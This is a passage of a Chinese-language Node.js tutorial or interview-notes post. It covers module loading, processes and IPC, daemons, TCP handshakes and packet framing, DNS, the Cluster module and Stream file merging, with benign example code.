    <content type="text"><![CDATA[NodeJS模块与文件require 的加载机制模块的分类系统模块 C/C++模块，也叫build-in内建模块，一般用于native模块嗲用，在require出去 native模块，在开发中使用的Node.js 的 http/buffer/fs等，底层也是调用的内建模块（C/C++） 第三方模块： 非Node.js自带的模块被称为第三方模块，会分成路径形式的文件模块（以.、..、/开头的）和自定义的模块（比如express/koa/moment.js等） 在 Node.JS 中模块加载一般会经历3个步骤：路径分析、文件定位、编译执行 按照模块的分类，按照以下的顺序进行优先加载： 系统缓存：模块被执行之后会进行缓存，首先是先进行缓存加载，判断换粗中是否有值。 系统模块：也就是原生模块，优先级次于系统缓存，部分核心模块已经被编译成二进制，省略了路径分析、文件定位，直接加载在内存中，系统模块定义在 Node.js 源码的lib目录下。 文件模块：优先加载 .、..、/开头的，如果文件没有加上拓展名，会依次按照.js、.json、.node尝试进行拓展名补足。（在尝试过程中也是以同步阻塞模式来判断文件是否存在的，从性能优化角度来看，.json、node最好还是加上文件的拓展名） 目录作为模块：文件模块加载过程中没有找到，但发现这是一个目录，这个适合就会把这个目录当做一个包来处理，Node采用了commonjs规范，会先在项目的根目录查找package.json文件，取出文件中定义的main属性描述的入口文件进行加载，也没有加载到，则会抛出默认错误：Error：Cannot find module ‘lib/hello.js’ node_modules目录加载：对于系统模块，路径文件模块都找不到，Nodejs会从当前模块的父目录进行查找，直到系统的根目录 module.exports 与 exports 的区别exports相当于 module.exports 的快捷方式： 1const exports = module.exports 但是不能改变 exports 的指向，我们可以通过 exports.test = &#39;a&#39;，这样来导出一个对象，但是不能通过下面的例子直接赋值，这样会改变 exports 的指向 1234567891011// 错误的写法，将会得到 undefinedexports = &#123; 'a':1, 'b':2 &#125;// 正确的写法modules.exports =&#123; 'a':1, 'b':2 &#125; 模块循环引用问题12345678910111213// a.jsconsole.log('a模块start');exports.test = 1;undeclaredVariable = 'a模块为声明变量'const b = require('./b');console.log('a模块加载完毕：b.test值',b.test);// b.js console.log('b模块start');exports.test = 2;const a = require('./a');console.log('undeclaredVariable:',undeclaredVariable)console.log('b模块加载完毕：a.test值：',a.test) 执行 node a.js,结果： 12345a模块startb模块startundeclaredVariable:a模块未声明变量b模块加载完毕：a.test值：1a模块加载完毕：b.test值：2 启动a.js会加载b.js，那么在b.js中又加载到了a.js，但是此时a.js模块hi阿咩有执行完，返回的是一个a.js模块的exports对象未完成的副本给到b.js模块（因此不会陷入死循环），然后b.js完成加载之后将exports 对象退供给a.js模块 a 模块中的 undeclaredVariable 变量在 b.js 是否会打印？undeclaredVariable 是一个未声明的变量，也就是一个挂在全局的变量，那么在其他地方是可以拿得到的 假设有 a.js、b.js 两个模块相互引用，会有什么问题，会不会陷入死循环？不会陷入死循环 BufferBuffer与Cache的区别缓冲（Buffer）缓冲是用于处理二进制流数据，将数据存储起来，它是临时性的，对于流式数据来说，会采用缓冲区将数据临时存储起来，等缓冲到一定大小的时候存入硬盘中。视频播放器就是一个经典例子。 缓存（Cache）缓存可以看做一个中间层，可以是永久性的将热点数据进行缓存，使得访问速度更快。例如我们通过对 memory、Redis等将数据从硬盘或者第三方接口中请求过来进行缓存，目的就是将数据存于内存的缓存区中，这样对同一个资源进行访问，速度会更快，也就是性能优化的一个重要点。 线程与进程什么是进程（Process）和线程（Thread），之间的区别进程进程是计算中程序关于数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位，是操作系统结构的基础，进程是线程的容器。启动一个服务，运行一个实例，就是开一个服务进程。多进程就是进程的复制（fork），fork出来的每个进程都有自己的独立空间地址、数据栈，一个进程无法访问另外一个进程里定义的变量、数据结构，只有建立了IPC通信，进程之间才可以数据共享。 线程线程是操作系统能够进行运算调度的最小单位，线程是隶属进程的，被包含与进程之中的。一个线程只能隶属一个进程，但是一个进程是可以拥有多个线程的。 同一个代码，可以根据系统CPU核心数启动多个进程，每个进程都有属于自己的独立运行空间，进程之间是不互相影响的。同一进程中的多条线程将共享该进程中的全部系统资源，如虚拟地址空间，文件描述和信号处理等。但 同一进程中的多个线程有各自的调用栈，自己的寄存器环境，自己的线程本地存储。 什么是孤儿进程父进程创建子进程之后，父进程退出了，但是父进程对应的一个或者多个子进程还在运行，这些子进程会被系统的init进程收养，对应的程序ppid为1，这就是孤儿进程。 创建多进程时，代码里有app.listen(port)在进行fork时，为什么没有报端口被占用端口被占用的情况： 12345678910111213141516// master.jsconst fork = require('child_process').fork;const cups = require('os').cups();for(let i=0;i&lt;cups.length;i++)&#123; const worker = fork('worker.js') console.log('worker process created, pid: %s ppid: %s', worker.pid, process.pid);&#125;// worker.jsconst http = require('http');http.createServer((req,res)=&gt;&#123; res.send('I am worker,pid:'+process.pid+', ppid: '+process.pid)&#125;).listen(3000);// 控制台执行node master.js只有一个worker 可以监听 3000 端口，其余会抛出 Error:listen EADDRINUSE :::3000错误 多进程模式可通过句柄传递不会有端口占用的问题。 当父子进程之间建立IPC通道之后，通过子进程对象的send方法发送消息，第二个参数sendHandle就是句柄，可以是TCP套接字，TCP服务器、UDP套接字等，为了解决上面多进程端口占用问题，将主进程的socket传递到子进程： 123456789101112131415161718192021222324252627282930313233// master.jsconst fork = require('child_process').fork;const cups = require('os').cpus();const server = require('net').createServer();server.listen(3000);process.title = 'node-master';for(let i=0;i&lt;cpus.length;i++)&#123; const worker = fork('worker.js') worker.send('server',server); console.log('worker process created, pid: %s ppid: %s', worker.pid, process.pid); if(i+1 === cpus.length)&#123; console.log('serve close'); server.close(); // 关闭服务器监听，交由子进程处理 &#125;&#125;// worker.jsconst http = require('http');const server = http.createServer((req,res)=&gt;&#123; res.end('I am worker, pid: ' + process.pid + ', ppid: ' + process.ppid);&#125;)let worker;process.title = 'node-worker';process.on('message',(message,sendHandle)=&gt;&#123; if(message === 'server')&#123; worker = sendHandle; worker.on('connection',(socket)=&gt;&#123; server.emit('connection',socket) &#125;) &#125;&#125;) 什么是IPC通信，如何建立，什么场景下会使用IPC(inter-process communication)，即进程间通信技术，由于每个进程创建之后都有自己的独立地址空间，实现IPC的目的就是进程之间的资源共享访问，实现IPC的方式有多种：管道、消息队列、信号量、Domain Socket，Nodejs通过pipe来实现。 未使用IPC的情况： 123456789// pipe.jsconst spawn = require('child_process').spawn;const child = spawn('node',['worker.js']);console.log(process.pid,child.pid);// worker.jsconsole.log('I am worker,PID:',process.pid)// 执行 node pipe.js，输出主线程的id，子线程的id，但是子线程worker.js的信息没有在控制台打印，原因是新创建的子进程有自己的 stdio流 创建一个父进程和子进程之间传递消息的IPC通道实现输出信息 123456789// 修改pipe.js让子进程的stdio和当前进程的stdio之间建立管道链接，还可以通过spawn方法的stdio选项建立IPC机制// pipe.jsconst spawn = require('child_process').spawn;const child = spawn('node',['worker.js']);child.stdout.pipe(process.stdout);console.log(process.pid,child.pid);// 父进程与子进程的通信// 父进程在创建子进程之前会先去创建IPC通道并一直监听该通道，之后开始创建子进程并通过环境变量（NODE_CHANNEL_FD）的方式将IPC频道的文件描述符传递给子进程，子进程启动时根据传递的文件描述符去链接IPC通道，从而建立父子进程之间的通信机制。 Node.js是单线程还是多线程，为什么会单线程javascript是单线程，在服务端运行环境的nodejs不是单线程。 浏览器环境中对于DOM的操作是单线程的，避免DOM渲染冲突，在浏览器中UI渲染线程和JS执行引擎是互斥的，一方在执行式都会导致另一方被挂起，这是由JS引擎所决定的。 关于守护进程，是什么，为什么，怎么编写？守护进程运行在后台不受终端影响。 创建步骤 创建子进程 在子进程中创建新会话（调用系统函数setsid） 改变子进程工作目录（如：’/‘或者’/usr/‘等） 父进程终止 编写demo12345678910111213141516171819202122232425// index.js文件的处理逻辑使用 spawn创建子进程完成第一步，设置options.detached为true可以使得子进程在父进程退出后继续运行（系统层会调用setsid方法），这是第二步。options.cwd指定当前子进程工作目录不做设置默认继承当前工作目录，这是第三步。运行daemon.unref()退出父进程，第四步。// index.jsconst spawn = require('child_process').spawn;function startDaemon()&#123; const daemon = spawn('node',['daemon.js'],&#123; cwd:'/usr', datached:true, stdio:'ignore', &#125;) console.log('守护进程开启 父进程 pid: %s, 守护进程 pid: %s', process.pid, daemon.pid); daemon.unref();&#125;startDaemon();// daemon.js文件哩逻辑开启一个定时器每10秒运行一次，使得这个资源不会退出，同时写入日志到子进程当前的工作目录下// /usr/daemon.jsconst fs = require('fs');const &#123;Console&#125; = require('console');const logger = new Console(fs.createWriteStream('./stdout.log'),fs.createWriteStream('./stderr.log'));setInterval(function()&#123; logger.log('daemon pid:',process.pid,'ppid: ',process.ppid)&#125;,1000*10) 实际工作中守护进程很多，例如PM2,Egg-Cluster等，实际工作上对于守护进程的健壮性要求还是很高的，例如：进程的异常监听，工作进程管理调度，进程挂掉之后重启等等。 实现一个简单的命令行交互程序采用子进程 child_process的spawn方法： 123const spawn = require('child_process').spawn;const child = spawn('echo',['简单的命令行交互']);child.stdout.pipe(process.stdout) // 将子进程的输出作为当前进程的输入，打印在控制台 进程的当前工作目录是什么，有什么用进程的当前工作目录可以通过process.cwd()命令获取，默认为当前启动的目录，如果是创建子进程则继承于父进程的目录，可以通过process.chdir()命令重置，例如通过spawn命令创建的子进程可以指定cwd选项设置子进程的工作目录。 有什么用，例如fs读取文件，如果设置为相对路径则是相当于当前进程启动的目录进行查找，所以，启动目的设置有误的情况下将无法得到正确的结果。还有一种情况程序里引用第三方模块也是根据当前进程启动的目录来进行查找的 多进程或者多个Web服务之间的状态共享问题多进程模式下各个进程之间是相互独立的，例如用户登录之后seesion的保存，如果保存在服务进程里，那么如果我有4个工作进程，每个进程都要保存一份这是没有必要的。假设服务重启了数据也会丢失。多个Web服务也是一样的，还会出现在A机器创建了Session，当负载均衡分到B机器上之后还需要再创建一份，一般的做法是通过Redis或者数据库来做数据共享 什么是僵尸进程使用fork可以创建子进程，正常情况进程退出，内核要释放进程所占用的资源：打开的文件、占用的内存等，但是进程的PID、退出状态、运行时间等会进行保留，知道父进程调用wait/waitpid来获取子进程的状态信息时，这些资源才会释放。 如果子进程退出之后，父进程没有调用wait/waitpid来获取子进程的状态，那么保留的进程号将会一直被占用，且占用系统资源，称为僵死或僵尸进程。 元凶是其父进程，我们把元凶kill掉之后，僵尸进程会变为孤儿进程被系统的 init 进程pid=1的进程所收养，init进程会对这些孤儿进程进行管理（调用wait/waitpid）释放其占用资源。 Consoleconsole是异步还是同步的console既不是总是同步的，也不总是异步的，是否为同步取决于链接是什么流以及操作系统是Window还是Posix 同步写将会阻塞实践循环直到写完成。 文件（Files）：Windows和POSIX平台都是同步 终端（TTYS）：Windows平台下同步，在POSIX平台下异步 管道（Pipes）：Windows平台下同步，POSIX平台下异步 如何实现一个console.log可利用 process.stdout将输入流数据输出到输出流（即输出到终端） 1process.stdout.write('xxx'+'\n') 为什么console.log()执行完就退出一旦产生事件循环，就会长产生一个While(true)的死循环，例如定时器，console.log则没有产生watch/handlers，在事件循环一次就退出了。 Nodejs进程退出会等待异步处理完成，常见的运维过程中会碰到需要进程优雅退出的场景，Nodejs自然退出是最好的，process.exit是比较粗暴的。 常见的异步请求： http请求，数据库请求等IO请求操作 net.Server.listen()或者http.Server.listen等端口监听 fs.write()类型的文件IO操作 console.log()输出日志 setTimeout()/setInterval等定时器操作 process.send()等异步请求发送 Net模块 OSI七层模型 TCP/IP五层模型 描述 应用层 应 构建于传输层之上常用的HTTP、FTP文件传输协议、SMTP邮件传输协议等 表示层 用 构建于传输层之上常用的HTTP、FTP文件传输协议、SMTP邮件传输协议等 会话层 层 构建于传输层之上常用的HTTP、FTP文件传输协议、SMTP邮件传输协议等 传输层 传输层 向用户提供可靠的端到端服务TCP、UDP 网络层 网络层 IPV4、IPV6 数据链路层 数据链路层 设备驱动和硬件 物理层 物理层 设备驱动和硬件 什么是TCP协议，什么时候会选择TCP协议IP协议是无连接通信协议，IP协议不会占用两个设备之间通信的线路，IP实际上主要负责将每个数据包路由至目的地，但是IP协议没有能确保数据包是否到达，传过去的数据是否按照顺序排列，所以IP数据包是不可靠的。而解决数据不可靠的问题就是由TCP协议来完成。 TCP（Transmission Control Protocol）是可靠的传输控制协议，三个特点： 面向链接：需要对方主机在线，并建立链接 面向字节流：发送多少字节自己说了算，每次选出一段字节发送的时候，都会带上一个序号，这个序号就是发送的这段字节中编号最小的字节的编号。 可靠：保证数据有序的到达对方主机，每发送一个数据就会期待收到对方的回复，在指定时间内收到了ACK回复，就确认数据到达，如果超过一定的时间没有收到对方的回复，就认为对方没有收到，再重新发送一次。 TCP报文 源端口（16） 目的端口（16） TCP序号（32） TCP序号（32） 捎带的确认（32） 捎带的确认（32） 首部长度（4）保留（6）Flag（6：URG、ACK、PSH、RST、SYN、FIN） 窗口尺寸（16） TCP校验和（16） 紧急指针（16） 数据包内容 数据包内容 6个标志位： URG,紧急指针标志，当为1时表示紧急指针有效，为0时则忽略紧急指针 ACK,确认序号标志，为1表示确认有效，为0表示报文不含有确认信息，确认号无误 PSH,push标志，当为1时就是让接收方收到该TCP报文的时候不进入缓冲区排队而是快速发送给应用程序 RST,重置连接标志，当连接出现错误的时可以重置，或者用于拒绝非法的报文段和连接请求 SYN,同步序号，用于建立连接过程 FIN,finish标志，用于释放连接 3次握手协议： 第一次握手，当客户端需要去建立连接时，客户端就会发送SYN包（seq=x）到服务器，然后客户端进入SYN_SEND的状态，代表已经发SYN包过去，并且在等待服务器确认。此时，ACK=0,SYN=1。 第二次握手，服务器收到SYN包，会进行确认，由上面的标志知道SYN是表示同步序号，这时候会使得 确认号=序号+1，即ack等于x+1,然后服务器也会像客户端发送一个SYN包（seq=y),也就是服务器会发送SYN+ACK包，来表示确认到了客户端的一次握手并且二次握手建立，此时服务器进入SYN_RECV状态。此时，ACK=1,SYN=1。 第三次握手，客户端收到服务器的SYN+ACK包，然后就会向服务器发送确认包ACK(ack=y+1)和SYN(seq=x+1),等到这个包发送完毕之后客户端和服务器就会进入ESTABLISHED状态，完成三次握手，就可以在服务器与客户端之间传输数据了。 SYN是同步序号，当SYN=1而ACK=0时表明这是一个连接请求报文，对方若同意连接，那应在报文中使SYN=1和ACK=1，因此SYN置1表示这是一个连接请求或者连接接受报文。而ACK状态是用来确认是否同意连接。也就是传了SYN,证明发送方到接收方的通道没有问题，但是接收方到发送方的通道还需要ACK信号来验证 当在传送完数据之后，客户端与服务器端之间有四次握手协议： 第一次握手：客户端发送一个FIN和序号过去（seq=u）用来表示客户端和服务端之间有关闭的请求，同时关闭客户端的数据传送，客户端就进入FIN_WAIT_1的状态 第二次握手：服务端收到FIN=1的标志位，就会发送一个ACK标志位表示确认，然后确认序号就变成了收到的序号+1,即ack=u+1(FIN和SYN在这点相同，但是作用不一样)这时候服务端进入CLOSE_WAIT状态，这是一个半关闭状态。只能服务端给客户端发送数据而客户端不能给服务端发送数据 第三次握手：这次握手还是服务端发起的。这是服务端在传完最后的数据（没有就不传）就会发送一个FIN=1和ACK=1,且序号seq会改变（没有传数据则不变），而ack不变，这时候服务端就会进入LAST_ACK状态，表示最后再确认一次。 第四次握手：客户端在接收到FIN之后，就会进入TIME_WAIT状态，接着发送一个ACK和seq=u+1,ack=w+1给服务端，这时候服务端就会进入CLOSED状态。而客户端进入TIME_WAIT状态的时候必须要等待2MSL的时间才会关闭 TIME_WAIT状态的作用？（MSL：网络中数据报文存在的最大时间） TIME_WAIT状态可以确保有足够的时间让对方接收到ACK包，如果ACK没有到达，在传输过程丢失了或者一些其他原因，这样就可以让客户端重发ACK包，如果客户端直接关闭了，那么就有可能导致服务端在一些情况下没有接受到ACK包而无法与客户端断开连接。这样客户端发送ACK包到服务端，服务端请求重发，一来一回就刚好是2MSL 保证迟来的TCP报文段有足够的时间被识别并丢弃，linux中一个TCPort不能打开两次或者两次以上。当client处于time_wait状态时无法使用此port建立新连接，假设不存在time_wait状态，新连接可能会受到旧连接的数据 TCP粘包是什么,该怎么办客户端（发送一端）在发送之前会将短时间有多个发送的数据块缓冲到一起（发送缓冲区），形成了一个大的数据块一并发送，同样接收端也有一个接收缓冲区，收到的数据先存放在接收端缓冲区，然后程序从这里读取部分数据进行消费，这样做也是为了减少I/O消耗达到性能优化。 数据达到缓冲区什么时间开发发送这个取决于TCP拥塞控制，是任何时刻内确定能被发送出去的字节数的控制因素之一，是阻止发送方至接收方之间的链路变得拥塞的手段 TCP粘包解决方案： 延迟发送：设置延迟发送，sleep休眠一段时间。简单但是传输效率大大降低，只适用于交互频率低的情况 关闭nagle算法。nagle算法是一种改善网络传输效率的算法，避免网络中充斥着大量小的数据块，它所期望的是尽可能发送大的数据块，因此在每次请求一个数据块给TCP发送时，TCP并不会立即执行发送，而是等待一小段时间进行发送。 当网络中充斥着大量小的数据块时，Nagle算法能将小的数据块集合起来一起发送减少了网络拥堵，但并不是所有场景都需要这样。例如，REPL终端交互，当用户输入单个字符以获取响应，所以在nodejs中可以设置 socket.setNoDelay方法来关闭Nagle算法。const server = net.createServer(); server.on(&#39;connection&#39;,socket=&gt;{socket.setNoDelay(true)}) 封包/拆包。使用长度编码的方式，通信双方约定好格式，将消息分为定长的消息头（Header）和不定长的消息体（Body），在解析时读取消息头获取到内容的占用的长度，之后读取到的消息体内容字节数等于字节头的字节数时，认为它是一个完整的包。 消息头序号（Header） 消息体长度（Header） 消息体（Body） SerialNumber bodyLength body 2字节 2字节 N字节 Buffer的几个api： Buffer.alloc(size[,fill[,encoding]]),初始化一个size大小的Buffer空间，默认填充0，也可以指定fill进行自动以填充 Buffer.writeInt16BE(value[,offset]),value为要写入的Buffer值，offset为偏移量从哪个位置开始写入 Buffer.writeInt32BE(value[,offset]),value为要写入的Buffer值，不同的是writeInt16BE表示高位优先写入一个16位整型，这个是32位 Buffer.readInt16BE([offset])，高位优先读取16位整型，offset为读取之前要跳过的字节数 Buffer.readInt32BE([offset])，高位优先读取32位整型，offset为读取之前要跳过的字节数 编码/解码的实现TCP顶层是基于二进制数据，应用层通常是易于表达的字符串、数字等，需要先将数据通过Buffer转换为二进制，取出的时候同样需要解码操作。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// transcoder.jsclass Transcoder &#123; constructor() &#123; this.packageHeaderLen = 4; // 包头长度 this.serialNumber = 0; // 定义包序号 this.packageSerialNumberLen = 2; // 包序列号所占用的字节 &#125; /** * 编码 * @param &#123;Object&#125; data Buffer 对象数据 * @param &#123;Int&#125; serialNumber 包序号，客户端编码时自动生成，服务器解码之后在编码时需要传入解码的包序号 */ encode(data, serialNumber) &#123; const body = Buffer.from(data); const header = Buffer.alloc(this.packageHeaderLen); header.writeInt16BE(serialNumber || this.serialNumber); header.writeInt16BE(body.length, this.packageSerialNumberLen); // 跳过包序号的前两位 if (serialNumber === undefined) &#123; this.serialNumber++; &#125; return Buffer.concat([header, body]) &#125; /** * 解码 * @param &#123;Object&#125; buffer */ decode(buffer) &#123; const header = buffer.slice(0, this.packageHeader); // 获取包头 const body = buffer.slice(this.packageHeaderLen); // 获取包尾部 return &#123; serialNumber: header.readInt16BE(), bodyLength: header.readInt16BE(this.packageSerialNumberLen), // 因为编码阶段跳过两位，所以解码也需要跳过 body: body.toString(), &#125; &#125; /** * 获取包长度两种情况 * 1. 如果当前buffer长度数据小于包头，肯定不是一个完整的数据包，因此直接返回0不做处理（可能数据还没有接收完） * 2. 否则返回这个完整的数据包长度 * @param &#123;*&#125; buffer */ getPackageLength(buffer) &#123; if (buffer.length &lt; this.packageHeaderLen) &#123; return 0; &#125; return this.packageHeaderLen + buffer.readInt16BE(this.packageSerialNumberLen) &#125;&#125;module.exports = Transcoder; 客户端 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253const net = require('net');const Transcoder = require('./transcoder');const transcoder = new Transcoder();const client = net.createConnection(&#123; host: '127.0.0.1', port: 3000&#125;)let overageBuffer = null; //上一次Buffer剩下的数据client.on('data', buffer =&gt; &#123; if (overageBuffer) &#123; buffer = Buffer.concat([overageBuffer, buffer]) &#125; let packageLength = 0; // eslint-disable-next-line no-cond-assign while (packageLength = transcoder.getPackageLength(buffer)) &#123; const packageData = buffer.slice(0, packageLength); // 取出整个数据包 buffer = buffer.slice(packageLength); // 删除已经取出的数据包，这里采用的方法是把缓冲区（buffer）已取出的包给截掉 const result = transcoder.decode(packageData); // 解码 console.log(result) &#125; overageBuffer = buffer; // 记录剩余不完整的包&#125;).on('error', err =&gt; &#123; // 监听一个未开启的端口就会报 ECONNREFUSED错误 console.log(`服务器异常: $&#123;err&#125;`)&#125;).on('close', err =&gt; &#123; console.log(`客户链接断开！， $&#123;err&#125;`)&#125;)client.write(transcoder.encode('Nodejs 技术栈'))const arr = [ '1 JavaScript ', '2 TypeScript ', '3 Python ', '4 Java ', '5 C ', '6 PHP ', '7 ASP.NET ',];setTimeout(() =&gt; &#123; for (let i = 0; i &lt; arr.length; i++) &#123; console.log(arr[i]) client.write(transcoder.encode(arr[i])) &#125;&#125;, 1000) 服务端 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051const net = require('net');const Transcoder = require('./transcoder');const transcoder = new Transcoder();const HOST = '127.0.0.1';const PORT = 3000;let overageBuffer = null; // 上一次善剩余数据// 创建一个TCP服务实例const server = net.createServer();// 监听端口server.listen(PORT, HOST)server.on('listening', () =&gt; &#123; console.log(`服务已经开启在$&#123;HOST&#125;:$&#123;PORT&#125;`)&#125;).on('connection', socket =&gt; &#123; // data事件就是读取数据 socket.on('data', buffer =&gt; &#123; if (overageBuffer) &#123; buffer = Buffer.concat([overageBuffer, buffer]) &#125; let packageLength = 0; // eslint-disable-next-line no-cond-assign while (packageLength = transcoder.getPackageLength(buffer)) &#123; const packageData = buffer.slice(0, packageLength); //取出整个数据包 buffer = buffer.slice(packageLength); // 删除取出的数据包，这里采用的方法是把缓冲区buffer已取出的包截掉 const result = transcoder.decode(packageData); // 解码 console.log(result); socket.write(transcoder.encode(result.body, result.serialNumber)) &#125; overageBuffer = buffer; // 记录不完整的包 &#125;).on('end', () =&gt; &#123; console.log('socket end') &#125;).on('error', error =&gt; &#123; console.log('socket error', error) &#125;)&#125;).on('close', () =&gt; &#123; console.log('Server Close!')&#125;).on('error', err =&gt; &#123; if (err.code === 'EADDRINUSE') &#123; console.log('地址正被使用，重试中......') setTimeout(() =&gt; &#123; server.close(); server.listen(PORT.HOST) &#125;, 1000) &#125; else &#123; console.log(`服务器异常: $&#123;err&#125;`) &#125;&#125;) DNSDNS模块是基于UDP协议来实现的，在Nodejs中可以通过require(&#39;dns&#39;)实现域名的解析查询，Nodejs DNS模块分成两大类： 底层操作系统工具进行域名解析 链接到一个DNS网络服务器执行域名解析 底层操作工具域名解析123456// Nodejs DNS模块的 dns.lookup()方法使用底层操作系统进行域名解析，是不需要经过网络通信的const dns = require('dns');dns.lookup('laibh.top',(err,address,family)=&gt;&#123; console.log(`地址: $&#123;address&#125;,地址族：$&#123;family&#125;`)&#125;) 链接到DNS服务器执行域名解析12345// dns 模块除了 dns.lookup之外的函数，都会连接到实际DNS服务器以执行名称解析并始终使用网络执行DNS查询const dns = require('dns');dns.lookup('laibh.top',(err,records)=&gt;&#123; console.log(records)&#125;) dns.lookup与dns.resolve不同 虽然用异步的角度来使用dns.lookup，但是内部的libuv底层线程池中确实同步的调用 getaddrinfo(3)，所以可能有由于一些不确定的因素造成Node进程阻塞 与dns.lookup不同的是dns.resolve没有使用getaddrinfo(3)，而通过网络执行的DNS查询，始终保持异步不会对其他进程产生负面影响 DNS域名解析过程 浏览器DNS缓存。访问一个URL优先查找浏览器的DNS缓存，命中就返回。未命中就继续下一步，查找操作系统的缓存。当修改了本地hosts域名指向发现浏览器缓存没有变化是因为每个浏览器有一个固定值。 系统（OS）缓存。查看操作系统中是否有域名对应的IP,位于操作系统的hosts文件。 路由器缓存。当浏览器DNS与系统OS缓存均没有映射的时候，则请求会发送到路由器缓存中检查 ISP DNS缓存。ISP为互联网服务提供商。 DNS本地解析指的是系统缓存这一阶段，在浏览器缓存没有命中的情况下， 会从本地系统的一个hosts文件中寻找对应的IP Cluster （集群）在PM2的配置文件中可以设置exec_model:&#39;cluster和instance两个属性来设置开启多个进程，PM2其实就是利用Nodejs Cluster这个模块来实现的，还有eggJs中的egg-cluster模块在启用Worker进程也是用到这个模块。 123456789101112131415161718const cluster = require('cluster');const http = require('http');const numCPUs = require('os').cpus().length;if (cluster.isMaster) &#123; console.log(`Master 进程 $&#123;process.pid&#125; 正在运行`) for (let i = 0; i &lt; numCPUs; i++) &#123; cluster.fork(); &#125; cluster.on('exit', (worker, code, signal) =&gt; &#123; console.log(`Worker $&#123;worker.process.pid&#125; 已退出`) &#125;);&#125; else &#123; http.createServer((req, res) =&gt; &#123; res.send(`你好，哈哈哈 $&#123;process.pid&#125;`) &#125;).listen(8000); console.log(`Worker 进程 $&#123;process.pid&#125; 已启用`)&#125; 采用了哪种集群方式集群模式通常实现有两种： 1个Node实例开启多个端口，通过反向代理服务器向各端口服务进行转发 1个Node实例开启多个进程监听同一个端口，通过负载均衡技术分配请求（Master-&gt;Worker） 第一个方案存在的一个问题就是占用多个端口，造成资源浪费，由于多个实例是独立运行的，进程间通信不太好做。好处是稳定性高，各实例之间没有影响。 第二个方案多个Node进程去监听同一个端口，好处是进程间通信相对简单，减少了端口的资源浪费，但是这个时候需要保证服务进程的稳定性，特别是对Master进程稳定性要求会更高，编码也会复杂。 Nodejs中自带的Cluster模块正是采用了第二种方案。 多个进程为什么可以监听同一个端口端口不是被所有的进程全部监听，仅仅受到Master进程的监听。Master进程创建一个Socket并绑定监听到目标端口，通过子进程之间建立IPC通道之后，通过调用子进程的send方法，将Socket（链接句柄）传递过去。（Master通过cluster.fork方法创建的，本质上还是使用了child_process.fork这个方法） 使用 child_process.fork()创建的子进程，进行Socket传递的示例 123456789101112131415161718192021222324252627// master.jsconst fork = require('child_process').fork;const cpus = require('os').cpus();const server = require('net').createServer().listen(3000);for (let i=0; i&lt;cpus.length; i++) &#123; const worker = fork('worker.js'); // 将 Master 的 server 传递给子进程 worker.send('server', server); console.log('worker process created, pid: %s ppid: %s', worker.pid, process.pid);&#125;// worker.jsconst http = require('http');const server = http.createServer((req, res) =&gt; &#123; res.end('I am worker, pid: ' + process.pid + ', ppid: ' + process.ppid);&#125;);let worker;// 第二个参数 sendHandle 就是句柄，可以是 TCP套接字、TCP服务器、UDP套接字等process.on('message', function (message, sendHandle) &#123; if (message === 'server') &#123; worker = sendHandle; worker.on('connection', function(socket) &#123; server.emit('connection', socket); &#125;); &#125;&#125;); 端口会被主进程绑定监听一次，但是主进程和子进程在建立IPC通信之后，发送Socket到子进程实现端口共享，在之后Master接受到新的客户端链接后，通过负载均衡技术再转发到各Worker进程。 多个进程之间如何通信由于cluster.fork本质上还是使用child_process.fork()这个方法来创建子进程，进程间通信无非几种：pipe（管道）、消息队列、信号量、Domain Socket。Nodejs中是通过pipe(管道)实现的，pipe作用于之间有血缘关系的进程，通过fork传递，其本身也是一个进程，将一个进程的输出作为另外一个进程的输入。 如何对多个Worker进行请求转发在Nodejs中使用了RoundRobin负载均衡策略，简称RP,它的实现原理是一种无状态的轮询策略，假定每台服务器的硬件资源、处理性能都是相同的，根据进程的数量，依次分配，直到所有进程处理完了，再开始重新计算分配。优点是实现起来简洁也易用，缺点是如果出现某个请求占用的时间较长，就会导致负载不会太均衡。 RP这种负载均衡技术适用于同一组服务器拥有相同的软硬件配置且平均的服务请求响应 RP是一种常见的复杂均衡技术，Nginx中也有使用，另外在RP的基础上还衍生了一个Weighted Round-Robin权重负载均衡轮询算法，简称WRR,同样也是使用轮询的技术，但是在基础上考虑了服务器的处理能力，实现时为服务器加上权重，这种负载均衡算法能够确保高性能的服务器得到更多的使用率，避免低性能的服务器负载过重。 Nodejs负载均衡策略设置 RoundRobin,RR。设置时要使用cluster.SCHED_RR,如果通过环境变量设置要使用rr,如果用cluster对象获取 schedulingPolicy数字表示为2 Shared Socket，SS,设置时要用cluster.SCHED_NONE，如果通过环境变量设置要用node,如果用cluster对象获取schedulingPolicy数字表示为1 12345678910111213// cluster对象的schedulingPolicy属性设置const cluster = require('cluster');// 策略一：一种轮询的策略，默认值cluster.schedulingPolicy = cluster.SHCED_RR;// 策略二:由操作系统调度的策略cluster.schedulingPolicy = cluster.SCHED_NONE;cluster.fork();// 或者通过环境变量 NODE_CLUSTER_SCHED_POLICY设置：env NODE_CLUSTER_SCHED_POLICY = 'none' node app.js 基于Stream实现多文件合并一个简单的Stream操作创建一个可读流readable一个可写流writeable，通过管道pipe将可写流绑到可读流，一个简单的Stream操作就可以完成 12345678910111213141516171819const fs = require('fs');const readable = fs.createReadStream('./log/read.txt');const writeable = fs.createWriteStream('./log/write.txt');readable.pipe(writeable)// readable.pip(destionation[,option])// destionation：是一个可写流对象，也就是一个数据写入的目标对象// options:end,读取结束时终止写入流，默认值是true// 默认情况下不需要手动调用写入流的end方法关闭的，更改end为false写入的目标将会处于一直打开状态，此时就需要监听可读流的end时间，结束之后手动调用可写流的end事件。readable.pipe(writeable,&#123; end:false&#125;);readable.on('end',()=&gt;&#123; writeable.end('结束')&#125;) 如果可读流期间发什么什么错误，则写入的目标流将不会关闭，所以需要监听错误事件，手动关闭可写流，防止内存泄露。 多个文件通过Stream合并成一个文件设置可读流的end为false可以保持写入流一直处于打开状态，通过这种方式，一开始可写流处于打开状态，知道所有的可读流结束，我们再将可写流关闭。 123456789101112131415161718192021222324252627282930313233343536373839404142const fs = require('fs');const path = require('path');/** * Stream 合并 * @param &#123;String&#125; sourceFiles 源文件目录名 * @param &#123;String&#125; targetFile 目标文件*/function streamMerge(sourceFiles, targetFile) &#123; const scripts = fs.readdirSync(path.resolve(__dirname, sourceFiles)); // 获取源文件目录下的所有文件 const fileWriteStream = fs.createWriteStream(path.resolve(__dirname, targetFile)); // 创建一个可写流 streamMergeRecursive(scripts, fileWriteStream);&#125;/** * Stream 